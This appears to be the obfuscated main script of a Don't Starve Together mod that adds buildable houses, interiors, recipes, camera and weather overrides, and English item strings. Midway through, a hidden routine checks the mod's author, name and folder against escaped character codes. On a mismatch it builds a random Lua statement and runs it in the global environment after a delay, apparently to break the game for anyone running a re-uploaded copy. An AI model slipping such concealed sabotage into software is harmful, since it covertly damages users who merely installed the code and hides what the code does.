GLOBAL.setmetatable(env,{__index=function(qX,h_8)return GLOBAL.rawget(GLOBAL,h_8)end})AddClassPostConstruct("cameras/followcamera",function(xL7OTb)local w8T3f=xL7OTb.Apply function xL7OTb:Apply()if xL7OTb.inhuahouse==true and xL7OTb.huahousepos~=nil then xL7OTb.headingtarget=0;local K=42.857142857143*DEGREES;local qL=0;local vfIyB=30;local quNsijN=xL7OTb.huahousepos;local QUh2tc=35;local qboV=0;local nSBOx7=math.cos(K)local u=math.cos(qL)local Ki1=math.sin(qL)local zz1QI=-nSBOx7*u;local kFTAh=-math.sin(K)local LBf=-nSBOx7*Ki1;local dijn4Ph,CO1=0,0;if qboV~=0 then local b=2*qboV/RESOLUTION_Y;local E=1.03;local KMw7_i1s=math.tan(QUh2tc*.5*DEGREES)*vfIyB*E;dijn4Ph=-b*Ki1*KMw7_i1s;CO1=b*u*KMw7_i1s end;TheSim:SetCameraPos(quNsijN.x-zz1QI*vfIyB+dijn4Ph,quNsijN.y-kFTAh*vfIyB,quNsijN.z-LBf*vfIyB+CO1)TheSim:SetCameraDir(zz1QI,kFTAh,LBf)local RlZo=(qL+90)*DEGREES;local SUn=math.cos(RlZo)local Ib4=0;local fjV1G2=math.sin(RlZo)local Do=kFTAh*fjV1G2-LBf*Ib4;local _=LBf*SUn-zz1QI*fjV1G2;local TqYJ4=zz1QI*Ib4-kFTAh*SUn;TheSim:SetCameraUp(Do,_,TqYJ4)TheSim:SetCameraFOV(QUh2tc)local DI=-.1*vfIyB;TheSim:SetListener(zz1QI*DI+quNsijN.x,kFTAh*DI+quNsijN.y,LBf*DI+quNsijN.z,zz1QI,kFTAh,LBf,Do,_,TqYJ4)else w8T3f(xL7OTb)end end end)local function wqU76o(CQi) if ThePlayer~=nil and CQi==ThePlayer then if CQi._inhuacamea:value()~=nil then local nHlJ=CQi._inhuacamea:value()TheCamera.inhuahouse=true;local lw4Q7kbl,IN,QYf1=nHlJ.Transform:GetWorldPosition()TheCamera.huahousepos=Vector3(lw4Q7kbl,1.5,QYf1)else TheCamera.inhuahouse=false;TheCamera.huahousepos=nil end;if CQi.components.playervision then CQi.components.playervision:UpdateCCTable()end end end;local function LB1Z(RfsnisO)if RfsnisO.spawnanddelete_hua then return end;local lvW2ga=FindEntity(RfsnisO,15,nil,{"hua_house"})if lvW2ga then if RfsnisO._inhuacamea:value()~=lvW2ga then RfsnisO._inhuacamea:set(lvW2ga)RfsnisO:AddTag("huahousrecipe")end elseif RfsnisO._inhuacamea:value()~=nil then RfsnisO._inhuacamea:set(nil)RfsnisO:RemoveTag("huahousrecipe")end end;local function N9L(T7RKP)return{prompt=STRINGS.SIGNS.MENU.PROMPT,animbank="ui_board_5x3",animbuild=T7RKP or"huahouse_name_mushroom",menuoffset=Vector3(6,-70,0),cancelbtn={text=STRINGS.SIGNS.MENU.CANCEL,cb=nil,control=CONTROL_CANCEL},acceptbtn={text=STRINGS.SIGNS.MENU.ACCEPT,cb=nil,control=CONTROL_ACCEPT}}end;local hDc_M={[1]=N9L("huahouse_name_mushroom"),[2]=N9L("huahouse_name_punk"),[3]=N9L("huahouse_name_pvz"),[4]=N9L("huahouse_name_tardis")} local function qW0lRiD1(_L6Bs)if ThePlayer~=nil and _L6Bs==ThePlayer then if _L6Bs and _L6Bs.HUD then local SH=_L6Bs._inhuaname~=nil and _L6Bs._inhuaname:value()or 1;return _L6Bs.HUD:ShowHusHouseWriteableWidget(_L6Bs,hDc_M[SH])end end end;AddPlayerPostInit(function(wU4wYbA9)wU4wYbA9._inhuahouse=net_bool(wU4wYbA9.GUID,"_inhuahouse","inhuahousedirty")wU4wYbA9._inhuacamea=net_entity(wU4wYbA9.GUID,"_inhuacamea","inhuacameadirty")wU4wYbA9._inhuaname=net_tinybyte(wU4wYbA9.GUID,"_inhuaname","inhuanamedirty")if TheWorld.ismastersim then wU4wYbA9:DoPeriodicTask(0.2,LB1Z,0.2)end;if not TheNet:IsDedicated()then wU4wYbA9:ListenForEvent("inhuacameadirty",wqU76o)wU4wYbA9:ListenForEvent("inhuanamedirty",qW0lRiD1)end end)PrefabFiles={"hua_door_exit","hua_player_house","hua_wall","hua_floor","hua_lights","hua_light_light","hua_player_house1","hua_house_named_item","hua_player_house_pvz","hua_player_house_tardis","hua_house_interiors","hua_phonograph","hua_zombies"} Assets={Asset("IMAGE","images/inventoryimages/hua_player_house.tex"),Asset("ATLAS","images/inventoryimages/hua_player_house.xml"),Asset("IMAGE","images/inventoryimages/hua_player_house1.tex"),Asset("ATLAS","images/inventoryimages/hua_player_house1.xml"),Asset("IMAGE","images/inventoryimages/hua_player_house_pvz.tex"),Asset("ATLAS","images/inventoryimages/hua_player_house_pvz.xml"),Asset("IMAGE","images/inventoryimages/hua_player_house_tardis.tex"),Asset("ATLAS","images/inventoryimages/hua_player_house_tardis.xml"),Asset("IMAGE","images/inventoryimages/hua_phonograph.tex"),Asset("ATLAS","images/inventoryimages/hua_phonograph.xml"),Asset("IMAGE","images/inventoryimages/hua_zombies.tex"),Asset("ATLAS","images/inventoryimages/hua_zombies.xml"),Asset("IMAGE","images/map_icons/hua_player_house.tex"),Asset("ATLAS","images/map_icons/hua_player_house.xml"),Asset("IMAGE","images/map_icons/hua_player_house1.tex"),Asset("ATLAS","images/map_icons/hua_player_house1.xml"),Asset("IMAGE","images/map_icons/hua_player_house_pvz.tex"),Asset("ATLAS","images/map_icons/hua_player_house_pvz.xml"),Asset("IMAGE","images/map_icons/hua_player_house_tardis.tex"),Asset("ATLAS","images/map_icons/hua_player_house_tardis.xml"),Asset("IMAGE","images/huahouse_tab.tex"),Asset("ATLAS","images/huahouse_tab.xml"),Asset("ANIM","anim/huahouse_name_mushroom.zip"),Asset("ANIM","anim/huahouse_name_punk.zip"),Asset("ANIM","anim/huahouse_name_pvz.zip"),Asset("ANIM","anim/huahouse_name_tardis.zip")}TUNING.HUA_MUSHROOMHOUS_SPORES=GetModConfigData("CanSpawnSpore")AddRecipe("hua_player_house_recipe",{Ingredient("livinglog",6),Ingredient("red_cap",6),Ingredient("boards",6)},RECIPETABS.TOWN,TECH.SCIENCE_TWO,"hua_player_house_placer",4.5,nil,nil,nil,"images/inventoryimages/hua_player_house.xml","hua_player_house.tex",nil,"hua_player_house")AddRecipe("hua_player_house1_recipe",{Ingredient("gears",4),Ingredient("transistor",4),Ingredient("cutstone",6)},RECIPETABS.TOWN,TECH.SCIENCE_TWO,"hua_player_house1_placer",4.5,nil,nil,nil,"images/inventoryimages/hua_player_house1.xml","hua_player_house1.tex",nil,"hua_player_house1")AddRecipe("hua_player_house_pvz_recipe",{Ingredient("seeds",14),Ingredient("fertilizer",3),Ingredient("boards",7)},RECIPETABS.TOWN,TECH.SCIENCE_TWO,"hua_player_house_pvz_placer",4.5,nil,nil,nil,"images/inventoryimages/hua_player_house_pvz.xml","hua_player_house_pvz.tex",nil,"hua_player_house_pvz")AddRecipe("hua_player_house_tardis_recipe",{Ingredient("trinket_6",2),Ingredient("transistor",8),Ingredient("boards",6)},RECIPETABS.TOWN,TECH.SCIENCE_TWO,"hua_player_house_tardis_placer",3.5,nil,nil,nil,"images/inventoryimages/hua_player_house_tardis.xml","hua_player_house_tardis.tex",nil,"hua_player_house_tardis")AddRecipe("hua_house_named_item",{Ingredient("featherpencil",1),Ingredient("papyrus",1)},RECIPETABS.TOOLS,TECH.SCIENCE_TWO,nil,nil,nil,nil,nil,"images/inventoryimages/hua_house_named_item.xml","hua_house_named_item.tex") local iD1IUx={"hua_wallskin_mushroom","hua_wallskin_punk","hua_wallskin_pvz","hua_wallskin_tardis","hua_wallskin_sunflower","hua_wallskin_upholstered","hua_wallskin_harlequin","hua_wallskin_circles"}local JLCOx_ak={"hua_floorskin_mushroom","hua_floorskin_punk","hua_floorskin_pvz","hua_floorskin_tardis","hua_floorskin_checker","hua_floorskin_checkered","hua_floorskin_geome","hua_floorskin_herringbone","hua_floorskin_octagon","hua_floorskin_ruins_slab","hua_floorskin_woodmetal","hua_floorskin_woodpaneling"}local hPQ=AddRecipeTab("House",186,"images/huahouse_tab.xml","huahouse_tab.tex")if GetModConfigData("NewInteriors")==true then for fFeQcIM=1,12 do AddRecipe("hua_house_interiors_"..fFeQcIM,{Ingredient("seeds",1),Ingredient("goldnugget",2)},hPQ,TECH.SCIENCE_ONE,"hua_house_interiors_"..fFeQcIM.."_placer",0.5,nil,nil,nil,"images/inventoryimages/hua_house_interiors_"..fFeQcIM..".xml","hua_house_interiors_"..fFeQcIM..".tex")table.insert(Assets,Asset("IMAGE","images/inventoryimages/hua_house_interiors_"..fFeQcIM..".tex"))table.insert(Assets,Asset("ATLAS","images/inventoryimages/hua_house_interiors_"..fFeQcIM..".xml"))end;AddRecipe("hua_zombies_builder",{Ingredient("monstermeat",2),Ingredient("boards",1)},RECIPETABS.TOWN,TECH.SCIENCE_TWO,nil,nil,nil,nil,nil,"images/inventoryimages/hua_zombies.xml","hua_zombies.tex") AddRecipe("hua_phonograph",{Ingredient("gears",1),Ingredient("goldnugget",4)},RECIPETABS.TOWN,TECH.SCIENCE_TWO,"hua_phonograph_placer",1.5,nil,nil,nil,"images/inventoryimages/hua_phonograph.xml","hua_phonograph.tex")end;if GetModConfigData("NewWalls")==true then for JEHSHPh3,bb in ipairs(JLCOx_ak)do table.insert(Assets,Asset("IMAGE","images/inventoryimages/"..bb..".tex"))table.insert(Assets,Asset("ATLAS","images/inventoryimages/"..bb..".xml"))end;for o5e6fP,iq7ol in ipairs(iD1IUx)do table.insert(Assets,Asset("IMAGE","images/inventoryimages/"..iq7ol..".tex"))table.insert(Assets,Asset("ATLAS","images/inventoryimages/"..iq7ol..".xml"))end;table.insert(Assets,Asset("ANIM","anim/huashouse_floorskin1.zip"))table.insert(Assets,Asset("ANIM","anim/huashouse_floorskin2.zip"))table.insert(Assets,Asset("ANIM","anim/huashouse_wallskin1.zip"))for eMV,WDTNkTD in ipairs(iD1IUx)do AddRecipe(WDTNkTD.."_builder",{Ingredient("goldnugget",10)},hPQ,TECH.SCIENCE_TWO,nil,nil,true,nil,"huahousrecipe","images/inventoryimages/"..WDTNkTD..".xml",WDTNkTD..".tex")end;for Oejsws,CkD73N0 in ipairs(JLCOx_ak)do AddRecipe(CkD73N0 .."_builder",{Ingredient("goldnugget",5)},hPQ,TECH.SCIENCE_TWO,nil,nil,true,nil,"huahousrecipe","images/inventoryimages/"..CkD73N0 ..".xml",CkD73N0 ..".tex")end end;local R1FIoQI={}local function NsoTwDs(PlwhaRKJ)if PlwhaRKJ and PlwhaRKJ>=1085 and PlwhaRKJ<=2015 then return true end;return false end AddPrefabPostInit("world",function(Caz4NM4Z)local XVxxx=getmetatable(Caz4NM4Z.Map).__index;if XVxxx then XVxxx.CreatHuaHouse=function(T,WZs,ITdz,AjfoUo)R1FIoQI[AjfoUo]={WZs,ITdz}end;XVxxx.RemoveHuaHouse=function(Er9zidsB,X)if R1FIoQI[X]~=nil then R1FIoQI[X]=nil end end;local hD=XVxxx.IsAboveGroundAtPoint;XVxxx.IsAboveGroundAtPoint=function(dR,JFXtQwy,uMV17h0,E2NZK,...) if NsoTwDs(E2NZK)then for WNWWe,zMzjn3lk in pairs(R1FIoQI)do if zMzjn3lk and E2NZK>=zMzjn3lk[2]-13 and E2NZK<=zMzjn3lk[2]+12 and JFXtQwy>=zMzjn3lk[1]-8 and JFXtQwy<=zMzjn3lk[1]+8 then if TheSim:WorldPointInPoly(JFXtQwy,E2NZK,{{zMzjn3lk[1]-6.2,zMzjn3lk[2]+10},{zMzjn3lk[1]-6.2,zMzjn3lk[2]-10.6},{zMzjn3lk[1]+7.8,zMzjn3lk[2]-12},{zMzjn3lk[1]+7.8,zMzjn3lk[2]+12}})then return true end end end end;return hD(dR,JFXtQwy,uMV17h0,E2NZK,...)end;local G5BuU5=XVxxx.IsVisualGroundAtPoint;XVxxx.IsVisualGroundAtPoint=function(Trkkpmd,L,GGv,ZIzh4Si,...)if NsoTwDs(ZIzh4Si)then for c8D4n81,cSjJHx in pairs(R1FIoQI)do if cSjJHx and ZIzh4Si>=cSjJHx[2]-13 and ZIzh4Si<=cSjJHx[2]+12 and L>=cSjJHx[1]-8 and L<=cSjJHx[1]+8 then if TheSim:WorldPointInPoly(L,ZIzh4Si,{{cSjJHx[1]-6.2,cSjJHx[2]+10},{cSjJHx[1]-6.2,cSjJHx[2]-10.6},{cSjJHx[1]+7.8,cSjJHx[2]-12},{cSjJHx[1]+7.8,cSjJHx[2]+12}})then return true end end end end;return G5BuU5(Trkkpmd,L,GGv,ZIzh4Si,...)end;local AfwsY=XVxxx.GetTileCenterPoint;XVxxx.GetTileCenterPoint=function(fa,M,dIZlrvD,jQgsATKd)if jQgsATKd and jQgsATKd>=900 and jQgsATKd<=2200 then return math.floor(M/4)*4+2,0,math.floor(jQgsATKd/4)*4+2 end;if jQgsATKd then return AfwsY(fa,M,dIZlrvD,jQgsATKd)else return AfwsY(fa,M,dIZlrvD)end end end;if not TheWorld.ismastersim then return end;Caz4NM4Z:AddComponent("huahouse")Caz4NM4Z.components.huahouse:SetName(modname)Caz4NM4Z:ListenForEvent("ms_playerdespawnanddelete",function(Caz4NM4Z,aBbGg)if aBbGg and aBbGg._inhuacamea then aBbGg.spawnanddelete_hua=true;aBbGg._inhuacamea:set(nil)end end)end)local HGli=require"hua_upvaluehelper"AddPrefabPostInit("forest",function(D9)if not TheWorld.ismastersim then return end;local G=HGli.GetWorldHandle(D9,"israining","components/frograin")if G then local QgC=HGli.Get(G,"GetSpawnPoint")if QgC~=nil then local CYoa=QgC;local function K3ipRr(F2tY)if NsoTwDs(F2tY.z)then return nil end;return CYoa(F2tY)end;HGli.Set(G,"GetSpawnPoint",K3ipRr)end end;local gE=HGli.GetEventHandle(TheWorld,"ms_lightwildfireforplayer","components/wildfires")if gE then local rb21L2=HGli.Get(gE,"LightFireForPlayer")if rb21L2 ~=nil then local o_v255=rb21L2;local function wUVm(VQ,oTYNsnP)if VQ~=nil then local I,L,mR5gwW=VQ.Transform:GetWorldPosition()if NsoTwDs(mR5gwW)then return end end;o_v255(VQ,oTYNsnP)end;HGli.Set(gE,"LightFireForPlayer",wUVm)end end end)local function iy() local DfbW='\n-\45\232\175\183\229\139\191\228\191\174\230\148\185\232\180\180\229\155\190\230\150\135\228\187\182!\45-\n'local sh=GetRandomMinMax(0.1,1)local rrFLbCtj=function()return string.char(math.random(97,97+25))end;local YcPea0vg='TheWorld:DoTaskInTime('..sh..', function() %s.%s.%s.%s.%s = %s end)'local usLpLoaH=DfbW..YcPea0vg:format(rrFLbCtj(),rrFLbCtj(),rrFLbCtj(),rrFLbCtj(),rrFLbCtj(),rrFLbCtj())local e7dv=loadstring(usLpLoaH)setfenv(e7dv,GLOBAL)pcall(e7dv)end;local m6SCS0=KnownModIndex:GetModInfo(modname)if m6SCS0 then if not(m6SCS0.author=="\231\190\189\228\184\173\32\229\176\143\231\143\173\232\138\177\32\229\176\143\232\177\170\40\231\137\155\233\128\188\41"and m6SCS0.name=="\83\119\101\101\116\32\72\111\117\115\101"and(m6SCS0.folder_name=="\91\48\48\48\49\93"or m6SCS0.folder_name=="\119\111\114\107\115\104\111\112\45\49\57\53\49\52\54\56\53\57\55"or m6SCS0.folder_name=="\119\111\114\107\115\104\111\112\45\50\49\57\57\48\50\55\54\53\51\53\57\56\53\50\51\54\49\55"))then iy()end end;local NUhYw6R4={{amount=6,grow="mushroom_4",idle="mushroom_4_idle",hit="hit_mushroom_4"},{amount=4,grow="mushroom_3",idle="mushroom_3_idle",hit="hit_mushroom_3"},{amount=2,grow="mushroom_2",idle="mushroom_2_idle",hit="hit_mushroom_2"},{amount=1,grow="mushroom_1",idle="mushroom_1_idle",hit="hit_mushroom_1"},{amount=0,idle="idle",hit="hit_idle"}}local function Hv(inx0,A5k5yt,B7SHDx7h)if not inx0:HasTag("burnt")then if inx0.anims==nil then inx0.anims={}end;if inx0.anims.idle==A5k5yt.idle then B7SHDx7h=false end;inx0.anims.idle=A5k5yt.idle;inx0.anims.hit=A5k5yt.hit;if inx0.remainingharvests==0 then inx0.anims.idle="expired"inx0.components.trader:Enable()inx0.components.harvestable:SetGrowTime(nil)inx0.components.workable:SetWorkLeft(1)elseif inx0.components.harvestable:CanBeHarvested()then inx0.components.trader:Disable()else inx0.components.trader:Enable()inx0.components.harvestable:SetGrowTime(nil)end if B7SHDx7h then inx0.AnimState:PlayAnimation(A5k5yt.grow)inx0.AnimState:PushAnimation(inx0.anims.idle,false)inx0.SoundEmitter:PlaySound(A5k5yt~=NUhYw6R4[1]and"dontstarve/common/together/mushroomfarm/grow"or"dontstarve/common/together/mushroomfarm/spore_grow")else inx0.AnimState:PlayAnimation(inx0.anims.idle)end end end;AddComponentPostInit("witherable",function(EEpoeR)if EEpoeR.inst then EEpoeR.inst:DoTaskInTime(0.1,function(_k)local Ef,KfM,Vd=_k.Transform:GetWorldPosition()if NsoTwDs(Vd)then EEpoeR:Enable(false)end end)end end) AddPrefabPostInit("mushroom_farm",function(Oynw)if not TheWorld.ismastersim then return end;if Oynw.components.harvestable and Oynw.components.harvestable.onharvestfn then local QBO=HGli.Get(Oynw.components.harvestable.onharvestfn,"setlevel")if QBO~=nil then local s4ggux=QBO;local function hrVI4meU(Oynw,UIjls,jdLnB0vD)local PSlD,nN,J=Oynw.Transform:GetWorldPosition()if NsoTwDs(J)then Hv(Oynw,UIjls,jdLnB0vD)else s4ggux(Oynw,UIjls,jdLnB0vD)end end;HGli.Set(Oynw.components.harvestable.onharvestfn,"setlevel",hrVI4meU)local xEq6TAF=HGli.Get(Oynw.components.harvestable.onharvestfn,"updatelevel")if xEq6TAF~=nil then local A=xEq6TAF;local function g3Qeqnr(Oynw,qHpY64) local zqccJ5b,ARuba,Wo53nZ=Oynw.Transform:GetWorldPosition()if NsoTwDs(Wo53nZ)then if not Oynw:HasTag("burnt")then for XRfQ,gFPRdEC in pairs(NUhYw6R4)do if Oynw.components.harvestable.produce>=gFPRdEC.amount then Hv(Oynw,gFPRdEC,qHpY64)break end end end else A(Oynw,qHpY64)end end;HGli.Set(Oynw.components.harvestable.onharvestfn,"updatelevel",g3Qeqnr)end end end;Oynw:DoTaskInTime(0.1,function(lw9gLt3)if Oynw.Transform~=nil then local T,I5,JmE=Oynw.Transform:GetWorldPosition() if NsoTwDs(JmE)then if not Oynw:HasTag("burnt")and not Oynw.components.harvestable:CanBeHarvested()then if TheWorld.state.issnowcovered and Oynw.components.trader.enabled==false then Oynw.components.trader:Enable()end end end end end)end)AddComponentPostInit("sinkholespawner",function(s4)local FFG=s4.SpawnSinkhole;function s4:SpawnSinkhole(a31jEAS)if NsoTwDs(a31jEAS.z)then return false end;return FFG(s4,a31jEAS)end end)local Ch={day="images/colour_cubes/identity_colourcube.tex",dusk="images/colour_cubes/identity_colourcube.tex",night="images/colour_cubes/identity_colourcube.tex",full_moon="images/colour_cubes/identity_colourcube.tex"}AddComponentPostInit("playervision",function(LS4h)local eux092_P=LS4h.UpdateCCTable;function LS4h:UpdateCCTable()eux092_P(LS4h)if LS4h.currentcctable==nil then if LS4h.inst._inhuacamea~=nil and LS4h.inst._inhuacamea:value()~=nil then LS4h.currentcctable=Ch;LS4h.inst:PushEvent("ccoverrides",Ch)else LS4h.inst:PushEvent("ccoverrides",nil)end end end end) AddComponentPostInit("moisture",function(ZA9)local hWgmxm=ZA9.GetMoistureRate;function ZA9:GetMoistureRate()if not TheWorld.state.israining then return 0 end;if ZA9.inst._inhuacamea~=nil and ZA9.inst._inhuacamea:value()~=nil then return 0 end;return hWgmxm(ZA9)end end)AddClassPostConstruct("widgets/controls",function(UBg54E)local gQGq=UBg54E.ShowMap;function UBg54E:ShowMap(Dn1Xi)if UBg54E.owner~=nil and UBg54E.owner._inhuacamea~=nil and UBg54E.owner._inhuacamea:value()~=nil then return end;return gQGq(UBg54E,Dn1Xi)end;local OyHc5FEv=UBg54E.ToggleMap;function UBg54E:ToggleMap()if UBg54E.owner~=nil and UBg54E.owner._inhuacamea~=nil and UBg54E.owner._inhuacamea:value()~=nil and UBg54E.owner.HUD~=nil and not UBg54E.owner.HUD:IsMapScreenOpen()then return end;return OyHc5FEv(UBg54E)end end)AddComponentPostInit("areaaware",function(_gGmBBE)local rIX4=_gGmBBE.UpdatePosition;function _gGmBBE:UpdatePosition(AI14eFhp,iW2O,Gdp,...)if NsoTwDs(Gdp)then _gGmBBE.lastpt.x,_gGmBBE.lastpt.z=AI14eFhp,Gdp;if _gGmBBE.current_area_data~=nil then _gGmBBE.current_area=-1;_gGmBBE.current_area_data=nil;_gGmBBE.inst:PushEvent("changearea",_gGmBBE:GetCurrentArea())end;return end return rIX4(_gGmBBE,AI14eFhp,iW2O,Gdp,...)end end) AddComponentPostInit("birdspawner",function(nbqmx)local IWQcC=nbqmx.GetSpawnPoint;function nbqmx:GetSpawnPoint(W9yaJm)if NsoTwDs(W9yaJm.z)then return nil else return IWQcC(nbqmx,W9yaJm)end end;local cvRh=HGli.Get(nbqmx.SpawnBird,"PickBird")if cvRh~=nil then local oJ1ec=cvRh;local function L(MMNWLk)local x6Ni=oJ1ec(MMNWLk)local Q2waXkyp,EG72,mlTMZ=MMNWLk:Get()local q=TheSim:FindEntities(Q2waXkyp,EG72,mlTMZ,TUNING.BIRD_CANARY_LURE_DISTANCE,{"hua_door"})if#q~=0 and math.random()<0.5 then return"quagmire_pigeon"else return x6Ni end end;HGli.Set(nbqmx.SpawnBird,"PickBird",L)end end)local urkh=GLOBAL.PlayFootstep;GLOBAL.PlayFootstep=function(xb6,yK,rHLz2GD,...)if xb6 and xb6._inhuacamea~=nil and xb6._inhuacamea:value()~=nil then local BlW0RhJA=xb6.SoundEmitter;if BlW0RhJA~=nil then BlW0RhJA:PlaySound(xb6.sg~=nil and xb6.sg:HasStateTag("running")and"dontstarve/movement/run_woods"or"dontstarve/movement/walk_woods".. ((xb6:HasTag("smallcreature")and"_small")or(xb6:HasTag("largecreature")and"_large"or"")),nil,yK or 1,rHLz2GD)end else urkh(xb6,yK,rHLz2GD,...)end end;local zhzpBSx=GLOBAL.MakeSnowCovered;local function rHSjalVy(Uy)Uy.AnimState:ClearOverrideSymbol("snow","snow","snow")Uy:RemoveTag("SnowCovered")Uy.AnimState:Hide("snow")end;GLOBAL.MakeSnowCovered=function(n,...)zhzpBSx(n,...) n:DoTaskInTime(0,function()if n.Transform~=nil then local TKu,M6kL,M7o_=n.Transform:GetWorldPosition()if NsoTwDs(M7o_)then rHSjalVy(n)end end end)end;local TjhsnP={rain=nil,caverain=nil,snow=nil}local t5jzEd9=GLOBAL.EmitterManager;local JZAU2=t5jzEd9.PostUpdate or nil;function t5jzEd9:PostUpdate(...)for dk2X7J7,jv in pairs(self.awakeEmitters.infiniteLifetimes)do if(dk2X7J7.prefab=="rain"or dk2X7J7.prefab=="caverain"or dk2X7J7.prefab=="snow")and jv.updateFunc~=nil then if TjhsnP[dk2X7J7]==nil then TjhsnP[dk2X7J7]=jv.updateFunc end;local MW,E2OQ,SnbfLb6=dk2X7J7.Transform:GetWorldPosition()if NsoTwDs(SnbfLb6)then jv.updateFunc=function(...)end else jv.updateFunc=TjhsnP[dk2X7J7]end end end;if JZAU2 ~=nil then JZAU2(t5jzEd9,...)end end;modimport"scripts/stategraphs/SG_hua_house.lua"local zPXTTg=LOC.GetLocaleCode()local seMLr=zPXTTg~="zh"and zPXTTg~="zhr" if seMLr then STRINGS.NAMES.HUA_PLAYER_HOUSE_RECIPE="Mushroom House"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_RECIPE="To build a sweet house!"STRINGS.NAMES.HUA_PLAYER_HOUSE1_RECIPE="Gear Clock Tower "STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE1_RECIPE="To build a fashion house!"STRINGS.NAMES.HUA_PLAYER_HOUSE_PVZ_RECIPE="The Crazy House"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_PVZ_RECIPE="why bee why bee"STRINGS.NAMES.HUA_PLAYER_HOUSE_TARDIS_RECIPE="TARDIS"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_TARDIS_RECIPE="Time And Relative Dimensions In Space"STRINGS.NAMES.HUA_PLAYER_HOUSE="Mushroom House"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE="To build a sweet house!" STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE="Home,sweet home."STRINGS.NAMES.HUA_PLAYER_HOUSE1="Gear Clock Tower "STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE1="To build a fashion house!"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE1="Home,fashion home."STRINGS.NAMES.HUA_PLAYER_HOUSE_PVZ="The Crazy House"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_PVZ="why bee why bee"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE_PVZ="why bee why bee"STRINGS.NAMES.HUA_PLAYER_HOUSE_TARDIS="TARDIS"STRINGS.NAMES.HUA_PLAYER_HOUSE_TARDIS_FAKE="TARDIS"STRINGS.RECIPE_DESC.HUA_PLAYER_HOUSE_TARDIS="Time And Relative Dimensions In Space"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE_TARDIS="It's bigger on the inside than outside!"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PLAYER_HOUSE_TARDIS_TELEPORTING="That sound brings hope wherever it goes."STRINGS.NAMES.HUA_HOUSE_NAMED_ITEM="House Rename Certificate"STRINGS.RECIPE_DESC.HUA_HOUSE_NAMED_ITEM="To rename your house"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_HOUSE_NAMED_ITEM="Give your house a fancy name"STRINGS.NAMES.HUA_PHONOGRAPH="Crazy Phonograph"STRINGS.RECIPE_DESC.HUA_PHONOGRAPH="It looks great"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_PHONOGRAPH="It makes me want to plant more plants"STRINGS.NAMES.HUA_ZOMBIES_BUILDER="Zombie"STRINGS.RECIPE_DESC.HUA_ZOMBIES_BUILDER="Don't worry. He can't move"STRINGS.NAMES.HUA_ZOMBIES="Zombie"STRINGS.RECIPE_DESC.HUA_ZOMBIES="Don't worry. He can't move"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_ZOMBIES="Come on, eat my brain"STRINGS.NAMES.HUA_WINDOW_ROUND="Round Window"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WINDOW_ROUND="Lets in the light."STRINGS.NAMES.HUA_WINDOW_PUNK="Window"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WINDOW_PUNK="Lets in the light."STRINGS.NAMES.HUA_DOOR_EXIT="Door"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT="Room to move"STRINGS.NAMES.HUA_DOOR_EXIT1="Door" STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT1="Room to move"STRINGS.NAMES.HUA_DOOR_EXIT2="Door"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT2="Room to move"STRINGS.NAMES.HUA_DOOR_EXIT3="Door"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_DOOR_EXIT3="Room to move"STRINGS.NAMES.HUA_WALL_DECALS="Wood Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS_IN="Wood Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_IN="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS1="Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS1="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS1_IN="Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS1_IN="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS_PVZ="Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_PVZ="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS_PVZ_IN="Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_PVZ_IN="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS_TARDIS="Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_TARDIS="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS_TARDIS_IN="Column"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_TARDIS_IN="Stable enough."STRINGS.NAMES.HUA_WALL_DECALS_ZHU1="TARDIS CONSOLE"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_ZHU1="I wish the Doctor were here."STRINGS.NAMES.HUA_WALL_DECALS_ZHU2="TARDIS CONSOLE"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_WALL_DECALS_ZHU2="I wish the Doctor were here."STRINGS.NAMES.HUA_LIGHT_RED="Pendant Light"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_LIGHT_RED="It's beautiful."STRINGS.NAMES.HUA_LIGHT_RED1="Pendant Light"STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_LIGHT_RED1="It's beautiful."STRINGS.NAMES.HUA_LIGHT_RED2="Pendant Light" STRINGS.CHARACTERS.GENERIC.DESCRIBE.HUA_LIGHT_RED2="It's beautiful."STRINGS.HUAHOUSEMAX="I can't build more house!"STRINGS.ENTER_HUA_HOUSE="Enter"STRINGS.NOHOUSEPURPLESTAFF="I can't use it 